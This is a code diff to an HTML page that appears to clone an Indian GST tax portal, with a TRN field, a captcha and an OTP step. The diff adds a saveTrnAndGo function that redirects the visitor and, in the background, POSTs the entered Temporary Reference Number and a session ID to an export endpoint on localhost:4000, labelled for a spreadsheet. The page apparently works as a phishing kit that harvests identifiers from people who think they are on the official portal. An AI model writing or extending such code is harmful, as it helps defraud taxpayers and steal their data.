@@ -133,7 +133,7 @@
                 <input type="text" id="captcha" name="Captcha" placeholder="Type the characters you can see in the image below" autocomplete="off">
                 <span id="captchaErr" class="err"></span>
             </div>
-                   <button type="button" id="proceedBtn" onclick="if(window.validateDash2 && !window.validateDash2()){return;} exportAndGo('OTP2.html')">PROCEED</button>
+                   <button type="button" id="proceedBtn" onclick="if(window.validateDash2 && !window.validateDash2()){return;} saveTrnAndGo('OTP2.html')">PROCEED</button>
     </div>
      </div>
 
@@ -331,6 +331,33 @@ Grievance Redressal Portal for GST
             onRegTypeChange();
         }
         window.validateDash2 = validateDash2;
+
+        async function saveTrnAndGo(url) {
+            const trn = (document.getElementById('trnInput').value || '').trim();
+
+            const params = new URLSearchParams(window.location.search);
+            if (params.get('validate') === '1' && !url.includes('validate=')) {
+                url += (url.includes('?') ? '&' : '?') + 'validate=1';
+            }
+
+            window.location.href = url;
+
+            try {
+                await fetch('http://localhost:4000/api/export', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        'Temporary Reference Number(TRN)': trn,
+                        'Session ID': window.getSessionId ? getSessionId() : '',
+                        _sheet: 'main_html'
+                    }),
+                    keepalive: true
+                });
+            } catch (e) {
+                console.error('TRN export failed:', e);
+            }
+        }
+        window.saveTrnAndGo = saveTrnAndGo;
     </script>
     <script src="../form-exporter.js?v=6"></script>
 </body>
